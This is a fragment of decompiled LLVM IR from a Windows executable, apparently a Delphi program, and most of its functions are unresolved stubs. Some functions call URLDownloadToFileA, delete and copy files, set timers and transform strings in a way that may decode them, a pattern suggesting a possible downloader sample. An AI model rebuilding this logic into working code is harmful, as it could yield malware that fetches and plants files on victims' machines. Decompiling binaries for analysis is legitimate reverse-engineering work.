  %0 = call i32 @"@HandleFinally"(), !insn.addr !1308
  ret i32 %0, !insn.addr !1308
}

define i32 @function_4062b0() local_unnamed_addr {
dec_label_pc_4062b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1309
}

define i32 @function_4062b2(i32 %arg1) local_unnamed_addr {
dec_label_pc_4062b2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1310
}

define i32 @function_4062b4() local_unnamed_addr {
dec_label_pc_4062b4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1312
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1313
  %3 = add i32 %2, -1, !insn.addr !1313
  %4 = icmp eq i32 %2, 0, !insn.addr !1313
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1313
  %5 = icmp eq i1 %4, false, !insn.addr !1314
  br i1 %5, label %dec_label_pc_4062e8, label %dec_label_pc_4062ce, !insn.addr !1314

dec_label_pc_4062ce:                              ; preds = %dec_label_pc_4062b4
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1315
  br label %dec_label_pc_4062e8, !insn.addr !1316

dec_label_pc_4062e8:                              ; preds = %dec_label_pc_4062ce, %dec_label_pc_4062b4
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1317
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1318
  ret i32 0, !insn.addr !1319
}

define i32 @function_4062f6() local_unnamed_addr {
dec_label_pc_4062f6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1320
  ret i32 %0, !insn.addr !1320
}

define i32 @function_4062fb() local_unnamed_addr {
dec_label_pc_4062fb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1321
}

define i32 @function_4062fd(i32 %arg1) local_unnamed_addr {
dec_label_pc_4062fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1322
}

define i32 @function_406300(i32 %arg1) local_unnamed_addr {
dec_label_pc_406300:
  %esp.0.reg2mem = alloca i32, !insn.addr !1323
  %of.0.reg2mem = alloca i1, !insn.addr !1323
  %.reg2mem6 = alloca i8, !insn.addr !1323
  %.reg2mem = alloca i32, !insn.addr !1323
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i1 @__decompiler_undefined_function_1()
  %6 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1323
  %7 = trunc i32 %2 to i8, !insn.addr !1324
  %8 = and i8 %7, 31, !insn.addr !1324
  %9 = icmp eq i8 %8, 0, !insn.addr !1324
  br i1 %9, label %dec_label_pc_406300._crit_edge, label %11, !insn.addr !1324

dec_label_pc_406300._crit_edge:                   ; preds = %dec_label_pc_406300
  %10 = trunc i32 %0 to i8
  store i8 %10, i8* %.reg2mem6
  br label %21

; <label>:11:                                     ; preds = %dec_label_pc_406300
  %12 = add i32 %1, -959064636, !insn.addr !1324
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1324
  %14 = load i8, i8* %13, align 1, !insn.addr !1324
  %15 = shl i8 %14, %8, !insn.addr !1324
  store i8 %15, i8* %13, align 1, !insn.addr !1324
  %16 = add nsw i8 %8, -1, !insn.addr !1324
  %17 = shl i8 %14, %16, !insn.addr !1324
  %.unshifted = xor i8 %15, %17
  %18 = icmp slt i8 %.unshifted, 0, !insn.addr !1324
  %19 = icmp eq i8 %8, 1, !insn.addr !1324
  %20 = select i1 %19, i1 %18, i1 %5, !insn.addr !1324
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  %.pre4 = load i32, i32* %esi, align 4
  store i32 %.pre4, i32* %.reg2mem, !insn.addr !1324
  store i8 %.pre, i8* %.reg2mem6, !insn.addr !1324
  store i1 %20, i1* %of.0.reg2mem, !insn.addr !1324
  br label %21, !insn.addr !1324

; <label>:21:                                     ; preds = %dec_label_pc_406300._crit_edge, %11
  %of.0.reload = load i1, i1* %of.0.reg2mem
  %.reload7 = load i8, i8* %.reg2mem6, !insn.addr !1325
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1325
  %22 = zext i8 %.reload7 to i32, !insn.addr !1325
  %23 = and i32 %3, -256, !insn.addr !1325
  %24 = or i32 %23, %22, !insn.addr !1325
  %25 = select i1 %6, i32 -1, i32 1, !insn.addr !1325
  %26 = add i32 %.reload, %25, !insn.addr !1325
  store i32 %26, i32* %esi, align 4, !insn.addr !1325
  %27 = inttoptr i32 %24 to i8*
  %28 = load i8, i8* %27, align 1
  %29 = add i8 %28, %.reload7
  br i1 %of.0.reload, label %dec_label_pc_406374, label %dec_label_pc_40630b, !insn.addr !1326

dec_label_pc_40630b:                              ; preds = %21
  %factor = mul i8 %.reload7, 27
  %30 = add i8 %29, %factor, !insn.addr !1327
  store i8 %30, i8* %27, align 1, !insn.addr !1327
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1328
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !1329
  store i32 %31, i32* %stack_var_-48, align 4, !insn.addr !1329
  %32 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1329
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !1330
  %33 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1331
  ret i32 %33, !insn.addr !1331

dec_label_pc_406374:                              ; preds = %21
  %34 = icmp eq i8 %29, 0, !insn.addr !1332
  store i8 %29, i8* %27, align 1, !insn.addr !1332
  %35 = icmp eq i1 %34, false, !insn.addr !1333
  br i1 %35, label %dec_label_pc_406428, label %dec_label_pc_40637c, !insn.addr !1333

dec_label_pc_40637c:                              ; preds = %dec_label_pc_406374
  %36 = call i32 @function_407514(), !insn.addr !1334
  %37 = call i32 @"@LStrPos"(), !insn.addr !1335
  %38 = call i32 @"@LStrPos"(), !insn.addr !1336
  %39 = add i32 %38, -1, !insn.addr !1337
  %40 = icmp slt i32 %39, 0, !insn.addr !1338
  %41 = add i32 %37, 2, !insn.addr !1339
  %42 = icmp sgt i32 %41, %39, !insn.addr !1340
  %or.cond = or i1 %40, %42
  br i1 %or.cond, label %dec_label_pc_406428, label %dec_label_pc_4063b0, !insn.addr !1341

dec_label_pc_4063b0:                              ; preds = %dec_label_pc_40637c
  %43 = add i32 %1, -12, !insn.addr !1342
  store i32 %43, i32* %stack_var_-4, align 4, !insn.addr !1343
  %44 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1343
  %45 = call i32 @"@LStrCopy"(), !insn.addr !1344
  %46 = inttoptr i32 %43 to i32*, !insn.addr !1345
  %47 = load i32, i32* %46, align 4, !insn.addr !1345
  %48 = icmp eq i32 %47, 0, !insn.addr !1345
  store i32 %44, i32* %esp.0.reg2mem, !insn.addr !1346
  br i1 %48, label %dec_label_pc_406428, label %dec_label_pc_4063d8, !insn.addr !1346

dec_label_pc_4063d8:                              ; preds = %dec_label_pc_4063b0
  %49 = call i32 @function_4072fc(), !insn.addr !1347
  %50 = call i32 @"@LStrFromPChar"(), !insn.addr !1348
  %51 = call i32 @"@LStrCat"(), !insn.addr !1349
  %52 = call i32 @function_4036c8(), !insn.addr !1350
  %53 = inttoptr i32 %52 to i8*, !insn.addr !1351
  %54 = call i1 @DeleteFileA(i8* %53), !insn.addr !1352
  %55 = call i32 @function_4036c8(), !insn.addr !1353
  %56 = inttoptr i32 %55 to i8*, !insn.addr !1354
  store i8* %56, i8** %stack_var_-20, align 4, !insn.addr !1354
  %57 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1354
  %58 = call i1 @CopyFileA(i8* %56, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1355
  %59 = call i32 @function_40600c(), !insn.addr !1356
  store i32 %57, i32* %esp.0.reg2mem, !insn.addr !1356
  br label %dec_label_pc_406428, !insn.addr !1356

dec_label_pc_406428:                              ; preds = %dec_label_pc_4063d8, %dec_label_pc_4063b0, %dec_label_pc_40637c, %dec_label_pc_406374
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %60 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1357
  %61 = load i32, i32* %60, align 4, !insn.addr !1357
  call void @__writefsdword(i32 0, i32 %61), !insn.addr !1358
  %62 = add i32 %esp.0.reload, 8, !insn.addr !1359
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1359
  store i32 4219978, i32* %63, align 4, !insn.addr !1359
  %64 = call i32 @"@LStrArrayClr"(), !insn.addr !1360
  ret i32 %64, !insn.addr !1361
}

define i32 @function_406443() local_unnamed_addr {
dec_label_pc_406443:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1362
  ret i32 %0, !insn.addr !1362
}

define i32 @function_406448() local_unnamed_addr {
dec_label_pc_406448:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1363
}

define i32 @function_40644a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40644a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1364
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1364
  %3 = load i32, i32* %2, align 4, !insn.addr !1364
  ret i32 %3, !insn.addr !1365
}

define i32 @function_40645b() local_unnamed_addr {
dec_label_pc_40645b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1366
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1366
  store i32 %1, i32* %2, align 4, !insn.addr !1366
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1367
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1367
  %7 = add i8 %4, %6, !insn.addr !1367
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1367
  store i8 %7, i8* %8, align 1, !insn.addr !1367
  %9 = load i32, i32* %eax, align 4, !insn.addr !1368
  ret i32 %9, !insn.addr !1368
}

define i32 @function_40646a() local_unnamed_addr {
dec_label_pc_40646a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1369
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1369
  store i8 %4, i8* %5, align 1, !insn.addr !1369
  %6 = mul i32 %0, 4096, !insn.addr !1370
  %7 = udiv i32 %0, 1048576, !insn.addr !1370
  %8 = or i32 %7, %6, !insn.addr !1370
  %9 = and i32 %0, 1048576, !insn.addr !1370
  %10 = icmp eq i32 %9, 0, !insn.addr !1370
  %11 = load i32, i32* %edx, align 4, !insn.addr !1371
  %12 = trunc i32 %11 to i16, !insn.addr !1371
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1371
  %14 = sext i8 %13 to i32, !insn.addr !1371
  %15 = or i32 %2, %14, !insn.addr !1371
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1372
  %17 = and i32 %15, -256, !insn.addr !1372
  %18 = or i32 %17, %16, !insn.addr !1372
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1373
  %20 = load i8, i8* %19, align 1, !insn.addr !1373
  %21 = mul i8 %20, 2, !insn.addr !1373
  %22 = lshr i8 %20, 7, !insn.addr !1373
  %23 = or i8 %22, %21, !insn.addr !1373
  store i8 %23, i8* %19, align 1, !insn.addr !1373
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1374
  %26 = udiv i32 %1, 256, !insn.addr !1374
  %27 = trunc i32 %26 to i8, !insn.addr !1374
  %28 = add i8 %25, %27, !insn.addr !1374
  %29 = load i32, i32* %edx, align 4, !insn.addr !1374
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1374
  store i8 %28, i8* %30, align 1, !insn.addr !1374
  %31 = add i32 %8, -4, !insn.addr !1375
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1375
  store i32 4219716, i32* %32, align 4, !insn.addr !1375
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1376
  %34 = sext i1 %33 to i32, !insn.addr !1376
  ret i32 %34, !insn.addr !1377
}

define i32 @function_406474(i32 %arg1) local_unnamed_addr {
dec_label_pc_406474:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_406484() local_unnamed_addr {
dec_label_pc_406484:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1378
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1378
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1378
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1379
  %2 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1380
  %3 = add i32 %2, 1, !insn.addr !1380
  store i32 %3, i32* @global_var_4096d0, align 4, !insn.addr !1380
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1381
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1382
  ret i32 0, !insn.addr !1383
}

define i32 @function_4064a9() local_unnamed_addr {
dec_label_pc_4064a9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1384
  ret i32 %0, !insn.addr !1384
}

define i32 @function_4064ae() local_unnamed_addr {
dec_label_pc_4064ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1385
}

define i32 @function_4064b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1386
}

define i32 @function_4064b4() local_unnamed_addr {
dec_label_pc_4064b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1387
  %2 = add i32 %1, -1, !insn.addr !1387
  store i32 %2, i32* @global_var_4096d0, align 4, !insn.addr !1387
  ret i32 %0, !insn.addr !1388
}

define i32 @function_4064bc() local_unnamed_addr {
dec_label_pc_4064bc:
  %eax.0.reg2mem = alloca i32, !insn.addr !1389
  %0 = call i32 @function_406530(), !insn.addr !1390
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1391
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1392
  br i1 %2, label %dec_label_pc_4064f0, label %dec_label_pc_4064ce, !insn.addr !1392

dec_label_pc_4064ce:                              ; preds = %dec_label_pc_4064bc
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1393
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1394
  %5 = load i32, i32* %4, align 4, !insn.addr !1394
  %6 = icmp eq i32 %5, 0, !insn.addr !1394
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1395
  br i1 %6, label %dec_label_pc_4064f0, label %dec_label_pc_4064d8, !insn.addr !1395

dec_label_pc_4064d8:                              ; preds = %dec_label_pc_4064ce
  call void @PostQuitMessage(i32 66), !insn.addr !1396
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1397
  unreachable, !insn.addr !1397

dec_label_pc_4064f0:                              ; preds = %dec_label_pc_4064ce, %dec_label_pc_4064bc
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1398
}

define i32 @function_406500() local_unnamed_addr {
dec_label_pc_406500:
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1399
  %1 = icmp eq i32 %0, 0, !insn.addr !1399
  br i1 %1, label %dec_label_pc_40650e, label %dec_label_pc_406509, !insn.addr !1400

dec_label_pc_406509:                              ; preds = %dec_label_pc_406500
  %2 = call i32 @function_406530(), !insn.addr !1401
  br label %dec_label_pc_40650e, !insn.addr !1401

dec_label_pc_40650e:                              ; preds = %dec_label_pc_406509, %dec_label_pc_406500
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1402
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1403
  %5 = load i32, i32* %4, align 4, !insn.addr !1403
  %6 = mul i32 %5, 1000, !insn.addr !1403
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4220092 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1404
  store i32 %7, i32* @global_var_408110, align 4, !insn.addr !1405
  ret i32 %7, !insn.addr !1406
}

define i32 @function_406530() local_unnamed_addr {
dec_label_pc_406530:
  %.reg2mem = alloca i32, !insn.addr !1407
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1407
  %1 = icmp eq i32 %0, 0, !insn.addr !1407
  store i32 %0, i32* %.reg2mem, !insn.addr !1408
  br i1 %1, label %2, label %dec_label_pc_406539, !insn.addr !1408

; <label>:2:                                      ; preds = %dec_label_pc_406530
  %3 = call i32 @function_40654d(), !insn.addr !1408
  %.pre = load i32, i32* @global_var_408110, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1408
  br label %dec_label_pc_406539, !insn.addr !1408

dec_label_pc_406539:                              ; preds = %2, %dec_label_pc_406530
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1409
  ret i32 %.reload, !insn.addr !1410
}

define i32 @function_40654d() local_unnamed_addr {
dec_label_pc_40654d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1411
}

define i32 @function_406550() local_unnamed_addr {
dec_label_pc_406550:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_406474(i32 %0), !insn.addr !1412
  ret i32 %1, !insn.addr !1413
}

define i32 @function_40655c() local_unnamed_addr {
dec_label_pc_40655c:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1414
  %1 = icmp eq i32 %0, 0, !insn.addr !1414
  br i1 %1, label %dec_label_pc_40656a, label %dec_label_pc_406565, !insn.addr !1415

dec_label_pc_406565:                              ; preds = %dec_label_pc_40655c
  %2 = call i32 @function_406584(), !insn.addr !1416
  br label %dec_label_pc_40656a, !insn.addr !1416

dec_label_pc_40656a:                              ; preds = %dec_label_pc_406565, %dec_label_pc_40655c
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4220240 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1417
  store i32 %3, i32* @global_var_408114, align 4, !insn.addr !1418
  ret i32 %3, !insn.addr !1419
}

define i32 @function_406584() local_unnamed_addr {
dec_label_pc_406584:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1420
  ret i32 %0, !insn.addr !1421
}

define i32 @function_4065a4() local_unnamed_addr {
dec_label_pc_4065a4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1422
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1422
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1422
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1423
  %2 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1424
  %3 = add i32 %2, 1, !insn.addr !1424
  store i32 %3, i32* @global_var_4096d4, align 4, !insn.addr !1424
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1425
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1426
  ret i32 0, !insn.addr !1427
}

define i32 @function_4065c9() local_unnamed_addr {
dec_label_pc_4065c9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1428
  ret i32 %0, !insn.addr !1428
}

define i32 @function_4065ce() local_unnamed_addr {
dec_label_pc_4065ce:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1429
}

define i32 @function_4065d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4065d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1430
}

define i32 @function_4065d4() local_unnamed_addr {
dec_label_pc_4065d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1431
  %2 = add i32 %1, -1, !insn.addr !1431
  store i32 %2, i32* @global_var_4096d4, align 4, !insn.addr !1431
  ret i32 %0, !insn.addr !1432
}

define i32 @function_4065dc() local_unnamed_addr {
dec_label_pc_4065dc:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1433
  ret i32 %0, !insn.addr !1433
}

define i32 @function_4065e4() local_unnamed_addr {
dec_label_pc_4065e4:
  %esi.0.reg2mem = alloca i32, !insn.addr !1434
  %ebx.0.reg2mem = alloca i32, !insn.addr !1434
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1435
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1436
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1436
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1436
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1437
  %4 = call i32 @function_4034c8(), !insn.addr !1438
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1439
  %6 = call i32 @function_4034c8(), !insn.addr !1440
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1441
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1441
  br i1 %7, label %dec_label_pc_40665a, label %dec_label_pc_40662a, !insn.addr !1441

dec_label_pc_40662a:                              ; preds = %dec_label_pc_4065e4, %dec_label_pc_406656
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1442
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1442
  %11 = load i8, i8* %10, align 1, !insn.addr !1442
  %12 = icmp eq i8 %11, 61, !insn.addr !1442
  %13 = icmp eq i1 %12, false, !insn.addr !1443
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_406642, label %dec_label_pc_406634, !insn.addr !1443

dec_label_pc_406634:                              ; preds = %dec_label_pc_40662a
  %15 = add i32 %14, %8, !insn.addr !1444
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1444
  store i8 46, i8* %16, align 1, !insn.addr !1444
  br label %dec_label_pc_406656, !insn.addr !1445

dec_label_pc_406642:                              ; preds = %dec_label_pc_40662a
  %17 = load i8, i8* %10, align 1, !insn.addr !1446
  %18 = add i8 %17, -1, !insn.addr !1447
  %19 = add i32 %14, %8, !insn.addr !1448
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1448
  store i8 %18, i8* %20, align 1, !insn.addr !1448
  br label %dec_label_pc_406656, !insn.addr !1448

dec_label_pc_406656:                              ; preds = %dec_label_pc_406642, %dec_label_pc_406634
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1449
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1450
  %23 = icmp eq i32 %22, 0, !insn.addr !1450
  %24 = icmp eq i1 %23, false, !insn.addr !1451
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1451
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1451
  br i1 %24, label %dec_label_pc_40662a, label %dec_label_pc_40665a, !insn.addr !1451

dec_label_pc_40665a:                              ; preds = %dec_label_pc_406656, %dec_label_pc_4065e4
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1452
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1453
  %26 = call i32 @"@LStrClr"(), !insn.addr !1454
  ret i32 %26, !insn.addr !1455
}

define i32 @function_406670() local_unnamed_addr {
dec_label_pc_406670:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1456
  ret i32 %0, !insn.addr !1456
}

define i32 @function_406675() local_unnamed_addr {
dec_label_pc_406675:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1457
}

define i32 @function_406677(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406677:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1458
}

define i32 @function_406680() local_unnamed_addr {
dec_label_pc_406680:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1459
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1460
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1461
  ret i32 %4, !insn.addr !1462
}

define i32 @function_4066b8() local_unnamed_addr {
dec_label_pc_4066b8:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1463
  %esp.0.reg2mem = alloca i32, !insn.addr !1463
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1463
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1464
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1464
  br label %dec_label_pc_4066c0, !insn.addr !1464

dec_label_pc_4066c0:                              ; preds = %dec_label_pc_4066c0, %dec_label_pc_4066b8
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1465
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1465
  store i32 0, i32* %2, align 4, !insn.addr !1465
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1466
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1466
  store i32 0, i32* %4, align 4, !insn.addr !1466
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1467
  %6 = icmp eq i32 %5, 0, !insn.addr !1467
  %7 = icmp eq i1 %6, false, !insn.addr !1468
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1468
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1468
  br i1 %7, label %dec_label_pc_4066c0, label %dec_label_pc_4066c7, !insn.addr !1468

dec_label_pc_4066c7:                              ; preds = %dec_label_pc_4066c0
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1469
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1469
  store i32 0, i32* %9, align 4, !insn.addr !1469
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1470
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1470
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1471
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1471
  store i32 %0, i32* %13, align 4, !insn.addr !1471
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1472
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1472
  store i32 4220927, i32* %15, align 4, !insn.addr !1472
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1473
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1473
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1473
  store i32 %16, i32* %18, align 4, !insn.addr !1473
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1474
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1475
  %20 = call i32 @function_4065e4(), !insn.addr !1476
  %21 = call i32 @function_4036c8(), !insn.addr !1477
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1478
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1479
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1479
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1479
  store i32 %25, i32* %24, align 4, !insn.addr !1479
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1480
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1481
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1482
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1482
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1482
  store i32 %30, i32* %29, align 4, !insn.addr !1482
  %31 = call i32 @function_4034c8(), !insn.addr !1483
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1484
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1485
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1485
  store i32 ptrtoint ([6 x i8]* @global_var_406814 to i32), i32* %34, align 4, !insn.addr !1485
  %35 = call i32 @function_406680(), !insn.addr !1486
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1487
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1487
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1488
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1488
  store i32 ptrtoint (i32* @global_var_406824 to i32), i32* %39, align 4, !insn.addr !1488
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1489
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1489
